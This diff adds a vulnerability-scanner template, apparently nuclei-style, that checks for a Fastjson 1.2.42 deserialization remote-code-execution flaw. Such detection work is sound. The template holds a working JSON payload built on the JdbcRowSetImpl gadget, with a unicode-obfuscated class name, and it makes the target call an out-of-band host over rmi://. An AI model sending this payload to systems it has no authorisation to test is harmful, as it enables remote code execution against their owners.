@@ -1,0 +1,34 @@
+id: fastjson-1-2-42-rce
+brief:
+    title: Fastjson 1.2.42 - Remote Code Execution
+    by: zh
+    level: critical
+    about: Fastjson 1.2.42 is susceptible to a deserialization remote code execution vulnerability
+    label:
+        - fastjson
+        - rce
+        - deserialization
+        - oast
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+           "@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;",
+           "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+           "autoCommit":true
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": status
+          status:
+            - 200
